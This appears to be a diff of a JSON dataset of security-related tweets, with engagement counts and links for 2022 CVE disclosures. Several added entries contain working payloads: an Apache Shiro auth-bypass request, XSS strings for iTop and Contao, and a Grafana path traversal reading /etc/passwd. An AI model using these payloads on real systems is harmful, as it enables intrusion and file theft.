@@ -35,6 +35,16 @@
     "username": "Horizon3Attack"
 }
 {
+    "tweetfavorites": 180,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 50,
+    "tweettext": "Apache Shiro CVE-2022-32532\nThis request can succeed\n\nGET /permit/any HTTP/1.1\nToken: momika\nAccess is not allowed when there is no token request header\n\nGET /permit/any HTTP/1.1\nIt can be bypassed in a simple way in special but common configurations\n\nGET /permit/a%0any HTTP/1.1",
+    "tweettime": "2022-06-29, 05:27:00",
+    "tweeturl": "https://twitter.com/momika233/status/1542016765030707206",
+    "username": "momika233"
+}
+{
     "expanded_url": [
         "https://blog.sonarsource.com/zimbra-pre-auth-rce-via-unrar-0day/"
     ],
@@ -75,6 +85,19 @@
 }
 {
     "expanded_url": [
+        "https://github.com/kuron3k0/Spring-Data-Mongodb-Example"
+    ],
+    "tweetfavorites": 151,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 61,
+    "tweettext": "https://t.co/qmyC5hEBG5\nCVE-2022-22980: Spring Data MongoDB SpEL Expression injection vulnerability through annotated repository query methods https://t.co/jFv7mXtwdt",
+    "tweettime": "2022-06-21, 13:30:30",
+    "tweeturl": "https://twitter.com/momika233/status/1539239336558104576",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
         "https://labs.nettitude.com/blog/cve-2022-21972-windows-server-vpn-remote-kernel-use-after-free-vulnerability/"
     ],
     "tweetfavorites": 177,
@@ -85,6 +108,19 @@
     "tweettime": "2022-06-21, 08:41:54",
     "tweeturl": "https://twitter.com/reverseame/status/1539166711072624642",
     "username": "reverseame"
+}
+{
+    "expanded_url": [
+        "https://github.com/s1ckb017/PoC-CVE-2022-26809"
+    ],
+    "tweetfavorites": 114,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 36,
+    "tweettext": "https://t.co/NtvlODMlQp\nCVE-2022-26809",
+    "tweettime": "2022-06-19, 13:46:03",
+    "tweeturl": "https://twitter.com/momika233/status/1538518477342130176",
+    "username": "momika233"
 }
 {
     "expanded_url": [
@@ -289,6 +325,16 @@
     "username": "mr_r3bot"
 }
 {
+    "tweetfavorites": 112,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 36,
+    "tweettext": "CVE-2022-31402 iTop 3.0.1 XSS Vulnerability\n\nhttp://localhost/itop/webservices/export-v2.php\"()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;N8Zn(9266)&lt;/ScRiPt&gt;",
+    "tweettime": "2022-06-10, 04:36:33",
+    "tweeturl": "https://twitter.com/momika233/status/1535118697466953728",
+    "username": "momika233"
+}
+{
     "expanded_url": [
         "https://www.zerodayinitiative.com/blog/2022/6/7/cve-2022-26937-microsoft-windows-network-file-system-nlm-portmap-stack-buffer-overflow"
     ],
@@ -302,10 +348,10 @@
     "username": "thezdi"
 }
 {
-    "tweetfavorites": 134,
-    "tweetquotes": 1,
+    "tweetfavorites": 141,
+    "tweetquotes": 2,
     "tweetreplies": 1,
-    "tweetretweets": 42,
+    "tweetretweets": 51,
     "tweettext": "CVE-2022-1588 Contao 4.13.2 Cross-Site Scripting (XSS)\nURL: https://localhost/contao/\"&gt;&lt;svg//onload=alert('momika233')&gt;",
     "tweettime": "2022-06-08, 01:39:15",
     "tweeturl": "https://twitter.com/momika233/status/1534349304688967680",
@@ -320,6 +366,16 @@
     "tweettime": "2022-06-07, 13:47:09",
     "tweeturl": "https://twitter.com/jas502n/status/1534170095932821504",
     "username": "jas502n"
+}
+{
+    "tweetfavorites": 922,
+    "tweetquotes": 10,
+    "tweetreplies": 22,
+    "tweetretweets": 304,
+    "tweettext": "CVE-2022-32275 Grafana 8.4.3 allows reading files via (for example) a /dashboard/snapshot/%7B%7Bconstructor.constructor'/.. /.. /.. /.. /.. /.. /.. /.. /etc/passwd",
+    "tweettime": "2022-06-07, 09:30:36",
+    "tweeturl": "https://twitter.com/momika233/status/1534105534793920512",
+    "username": "momika233"
 }
 {
     "expanded_url": [
@@ -469,10 +525,10 @@
     "expanded_url": [
         "https://github.com/Nwqda/CVE-2022-26134"
     ],
-    "tweetfavorites": 196,
+    "tweetfavorites": 192,
     "tweetquotes": 3,
     "tweetreplies": 1,
-    "tweetretweets": 65,
+    "tweetretweets": 64,
     "tweettext": "Atlassian Confluence (CVE-2022-26134) - Unauthenticated Remote Code Execution (RCE)\nURL：https://t.co/OXIOSvXHL4",
     "tweettime": "2022-06-04, 04:24:06",
     "tweeturl": "https://twitter.com/momika233/status/1532941237405499392",
